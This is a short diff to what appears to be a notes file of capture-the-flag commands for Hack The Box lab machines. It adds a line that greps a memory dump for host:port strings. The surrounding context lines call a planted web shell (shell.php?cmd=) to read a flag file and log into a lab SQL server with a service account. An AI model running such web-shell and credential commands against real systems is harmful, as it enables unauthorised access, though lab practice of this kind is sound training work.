@@ -16,4 +16,5 @@ http://thetoppers.htb/shell.php?cmd=cat%20../flag.txt
 ```bash
 python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.128.157 -windows-auth
 strings -e l 2556.dmp | grep -E "(.*?)_(.*?)_"
+strings 300.dmp | grep -oP '.+\.\w+\:[1-9]\d+'
 ```
